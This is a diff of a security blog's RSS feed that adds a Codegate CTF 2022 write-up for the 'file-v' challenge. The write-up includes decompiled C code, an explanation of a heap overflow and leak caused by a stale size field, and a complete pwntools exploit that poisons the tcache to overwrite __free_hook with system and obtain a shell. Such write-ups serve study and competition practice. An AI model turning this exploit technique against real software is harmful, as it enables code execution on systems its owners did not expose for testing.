@@ -12,16 +12,366 @@
 	<atom:link href="https://pwnblog.github.io/category/writeups/feed/" rel="self" type="application/rss+xml" />
 	<link>https://pwnblog.github.io</link>
 	<description>Pwn the life</description>
-	<lastBuildDate>Tue, 15 Feb 2022 14:49:09 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 28 Feb 2022 03:10:26 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=5.9</generator>
+	<generator>https://wordpress.org/?v=5.9.1</generator>
 	<item>
+		<title>Codegate CTF 2022 file-v writeup</title>
+		<link>https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/</link>
+					<comments>https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#respond</comments>
+		
+		<dc:creator><![CDATA[rookie]]></dc:creator>
+		<pubDate>Mon, 28 Feb 2022 03:10:23 +0000</pubDate>
+				<category><![CDATA[writeups]]></category>
+		<guid isPermaLink="false">https://pwnblog.github.io/?p=101</guid>
+
+					<description><![CDATA[<p>codegate ctf 2022 file-v writeup</p>
+<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">Codegate CTF 2022 file-v writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<h2 id="0x1-filesystem">0x1 Filesystem?</h2>
+
+
+
+<p>The reason I chose this challenge is because nobody is focusing this challenge in my team, so I took a glance at it.</p>
+
+
+
+<p>This program consists 2 parts, first is main process which handle all our input, and a backend process(child) that handles all data passed by main process.</p>
+
+
+
+<p>These two process communicate with a socket pair.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  int fd[2]; // [rsp+0h] [rbp-18h] BYREF
+  unsigned __int64 v4; // [rsp+8h] [rbp-10h]
+
+  v4 = __readfsqword(0x28u);
+  *(_QWORD *)fd = -1LL;
+  banner();
+  initial();
+  if ( socketpair(1, 1, 0, fd) &gt;= 0 )
+  {
+    if ( fork() )
+      interface(fd[1]);
+    backend(fd[0]);
+  }
+  perror(&quot;socketpair&quot;);
+  exit(-1);
+}</code></pre></div>
+
+
+
+<p>The frontend process has following functions:</p>
+
+
+
+<ul><li>Create new file</li><li>Print files</li><li>Select file (perform some operations on specific file)<ul><li>Edit file name</li><li>Edit file color</li><li>Show file content</li><li>Edit file content</li><li>Save file changes</li><li>Remove file</li></ul></li></ul>
+
+
+
+<p>The backend process is simpler, accept specific operations from frontend process and store in memory:</p>
+
+
+
+<ul><li>Print files</li><li>Create new file</li><li>Select file ( actually just return a plain file structure)</li><li>Edit file ( actually just store file structure from frontend process)</li><li>Delete file</li></ul>
+
+
+
+<h2 id="0x2-bug">0x2 Bug?</h2>
+
+
+
+<p>At first I thought there&#8217;s a race condition bug because there&#8217;s a fork call, otherwise It doesn&#8217;t need to fork a new process.</p>
+
+
+
+<p>But let&#8217;s take a closer look at edit function in frontend.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter content: &quot;);
+    v5 = gets(new_len);
+    v6 = ptr-&gt;total_bytes;
+    v7 = v5;
+    v8 = (file *)malloc(ptr-&gt;total_bytes - ptr-&gt;content_len + new_len);
+    memcpy(v8, ptr, v6);
+    v8-&gt;edit_time = time(0LL);
+    v9 = v8-&gt;filename_len;
+    v8-&gt;content_len = new_len;
+    memcpy(&v8-&gt;content[v9 + 1], v7, new_len);
+    free(ptr);
+    free(v7);</code></pre></div>
+
+
+
+<p><strong>The total_bytes isn&#8217;t updated!</strong></p>
+
+
+
+<p>How do we update this field? Let&#8217;s check edit name function.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter filename: &quot;);
+    v5 = gets(v4);
+    v6 = strlen(v5);
+    v7 = ptr-&gt;content_len + v6 + 0x19;
+    v8 = (file *)calloc(v7, 1uLL);
+    v8-&gt;total_bytes = v7;
+    v8-&gt;create_time = ptr-&gt;create_time;
+    v9 = time(0LL);
+    LODWORD(v7) = ptr-&gt;content_len;
+    v8-&gt;edit_time = v9;
+    v10 = ptr-&gt;color;
+    v8-&gt;filename_len = v6;
+    v8-&gt;content_len = v7;
+    v8-&gt;color = v10;
+    memcpy(v8-&gt;content, v5, v6);
+    memcpy(&v8-&gt;content[v6 + 1], &ptr-&gt;content[ptr-&gt;filename_len + 1], (unsigned int)v7);
+    free(ptr);
+    free(v5);</code></pre></div>
+
+
+
+<p><strong>total_bytes is actually updated in edit name!</strong></p>
+
+
+
+<p>What if, we first edit content like 0x100 bytes, edit name(update total_bytes) and second time we edit this content 0x20 bytes?</p>
+
+
+
+<p>memcpy<em>(v8, ptr, v6);</em> v6 is actually old total_bytes, which means we will overflow v8!</p>
+
+
+
+<h2 id="0x3-how-to-leak">0x3 How to leak?</h2>
+
+
+
+<p>Seems there&#8217;s only a oob write bug in edit, and likely it will cause heap crash, so how to leak?</p>
+
+
+
+<p>Let&#8217;s checksec first:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[+] checksec for &#39;/home/rookie/funnypwn/codegate/2022/filev/file-v&#39;
+Canary                        : ✓ 
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✓ 
+RelRO                         : Full</code></pre></div>
+
+
+
+<p>Everything is on, hmmm.</p>
+
+
+
+<figure class="wp-block-image"><img src="https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg" alt="Meme Challenge Accepted wallpaper | Challenge accepted, Book challenge,  Challenges"/></figure>
+
+
+
+<h2 id="0x4-save-to-rescue">0x4 Save to rescue</h2>
+
+
+
+<p>What if , we don&#8217;t update total_bytes?</p>
+
+
+
+<p>After we updating content_len in edit content, how about save the file struct directly without editing name?</p>
+
+
+
+<p>Let&#8217;s check frontend save function:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code> bufa[0] = 0x401012703LL;
+  if ( send(fd, bufa, 8uLL, 0) &lt; 0 || send(fd, &n, 4uLL, 0) &lt; 0 || send(fd, filename, n, 0) &lt; 0 )
+    goto LABEL_13;
+  if ( (int)recv(fd, &v7, 4uLL, 0) &lt; 0 )
+    goto LABEL_14;
+  if ( v7 == 0xC00000BB )
+    goto LABEL_10;
+  if ( send(fd, a4, 4uLL, 0) &lt; 0 || send(fd, a4, (unsigned int)a4-&gt;total_bytes, 0) &lt; 0 )
+  {
+LABEL_13:
+    perror(&quot;send&quot;);
+    exit(-1);
+  }</code></pre></div>
+
+
+
+<p>As you can see, the saved bytes is actually determined by total_bytes!</p>
+
+
+
+<p>If we make content_len larger than total_bytes, we can leak heap data by show content!</p>
+
+
+
+<script id="asciicast-ZxOKuyjOW4SIpDrMIg4xsWO5U" src="https://asciinema.org/a/ZxOKuyjOW4SIpDrMIg4xsWO5U.js" async></script>
+
+
+
+<h2 id="0x5-exploit">0x5 Exploit</h2>
+
+
+
+<p>The exploit is very straightforward, just abusing tcache link list, we can write free_hook to system and get shell.</p>
+
+
+
+<p>My exploit is a bit complex because I forgot libc 2.27 doesn&#8217;t check tcache chunk size, my first thought is writing one gadget to malloc_hook, but I didn&#8217;t found a useable one gadget. After some frustration I suddenly remembered libc 2.27 doesn&#8217;t check size metadata which means we can write anywhere!</p>
+
+
+
+<p>Here is my full exploit code:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *
+
+debug = 0
+# socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:&quot;env LD_PRELOAD=./libc-2.27.so ./file-v&quot;
+if debug:
+    os.system(&#39;pkill -9 file-v&#39;)
+    p = remote(&#39;127.0.0.1&#39;, 5555)
+    with open(&#39;/tmp/test.gdb&#39;, &#39;w&#39;) as f:
+        f.write(&#39;b *0x555555556AEA&#39;)
+    # run_in_new_terminal(&quot;gdb attach $(ps -C file-v -o pid|sed -n &#39;2p&#39;) -x /tmp/test.gdb&quot;)  # attach child
+    # e = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)
+    e = ELF(&#39;filev/libc-2.27.so&#39;)
+else:
+    p = remote(&#39;3.36.184.9&#39;, 5555)
+    e = ELF(&#39;filev/libc-2.27.so&#39;)
+
+
+def show_drive():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;a&#39;)
+    p.recvuntil(&#39;The number of files: &#39;)
+    count = int(p.recvuntil(&#39;\n&#39;))
+    files = []
+    if count:
+        for i in range(count):
+            p.recvuntil(f&#39;[{i}]:&#39;)
+            p.recvuntil(&#39; &#39;)
+            files.append(p.recvuntil(&#39;\x1B&#39;, drop=1))
+    return files
+
+
+def create(fn, l=None):
+    if not l:
+        l = len(fn)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;c&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendlineafter(&#39;:&#39;, fn)
+
+
+def select(fn):
+    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)
+    p.sendlineafter(&#39;:&#39;, fn)
+
+
+def edit_name(fn, l=None):
+    if not l:
+        l = len(fn)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;1&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendafter(&#39;:&#39;, fn)
+
+
+def show():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;3&#39;)
+    content = bytearray()
+    while True:
+        data = p.recvline_regex(r&#39;^\d+\s\|.+?\|&#39;, timeout=0.5)
+        if data:
+            for m in re.finditer(rb&#39;^\d+\s\|(.+?)\|&#39;, data, re.MULTILINE):
+                for hexbyte in m.group(1).strip().split(b&#39; &#39;):
+                    if hexbyte:
+                        content += bytearray([int(hexbyte.decode(), 16)])
+        else:
+            return content
+
+
+def edit(c, l=None):
+    if not l:
+        l = len(c)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;4&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendafter(&#39;:&#39;, c)
+
+
+def save():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;5&#39;)
+
+
+def rm():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;d&#39;)
+
+
+def back():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)
+
+
+create(&#39;rookie&#39;)
+create(&#39;fuck&#39;)
+select(&#39;rookie&#39;)
+edit(&#39;a&#39; * 0x90)
+save()
+back()
+select(&#39;rookie&#39;)
+data = show()
+heap = u64(data[0x19:0x21])
+libc = u64(data[0x79:0x81])
+e.address = libc - e.symbols[&#39;_IO_2_1_stderr_&#39;]
+log.success(f&#39;heap: 0x{heap:x} libc: 0x{e.address:x}&#39;)
+back()
+select(&#39;fuck&#39;)
+
+edit(&#39;a&#39; * (0x88 - 0x1d))
+edit_name(&#39;f&#39; * 0x67)
+edit_name(&#39;fuck&#39;)
+edit(b&#39;x&#39; * 0x69 + p64(0x71) + p64(e.symbols[&#39;__free_hook&#39;] - 0x13))
+edit_name(&#39;fuck&#39;)
+edit(b&#39;b&#39; * 0x49 + p64(0x101) + b&#39;b&#39; * 0x18)
+edit_name(&#39;fuck&#39;)
+edit(&#39;c&#39; * 0x49)
+payload = b&#39;/bin/sh\x00&#39; + b&#39;b&#39; * 0xb + p64(e.symbols[&#39;system&#39;])
+payload = payload.ljust(0x67)
+edit(payload)
+p.interactive()
+</code></pre></div>
+
+
+
+<p></p>
+<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">Codegate CTF 2022 file-v writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
 		<title>0CTF 2021 Quals &#8220;ioa&#8221; writeup</title>
 		<link>https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/</link>
+					<comments>https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/#respond</comments>
 		
 		<dc:creator><![CDATA[rookie]]></dc:creator>
 		<pubDate>Tue, 15 Feb 2022 14:24:11 +0000</pubDate>
@@ -135,7 +485,7 @@ unsigned int __fastcall is_vip_inuse(int a1)
 
 
 
-<figure class="wp-block-image size-large"><img width="1024" height="353" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png" alt="" class="wp-image-91" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png 1024w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-300x103.png 300w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-768x265.png 768w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2.png 1059w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="353" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png" alt="" class="wp-image-91" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png 1024w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-300x103.png 300w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-768x265.png 768w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2.png 1059w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
 
 
 
@@ -474,13 +824,14 @@ m.interactive()</code></pre></div>
 <p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
 ]]></content:encoded>
 					
+					<wfw:commentRss>https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</title>
 		<link>https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/</link>
-					<comments>https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#respond</comments>
 		
 		<dc:creator><![CDATA[rookie]]></dc:creator>
 		<pubDate>Wed, 09 Feb 2022 15:27:15 +0000</pubDate>
@@ -1176,8 +1527,6 @@ p.interactive()</code></pre></div>
 <p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/">Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
 		
 		
 			</item>
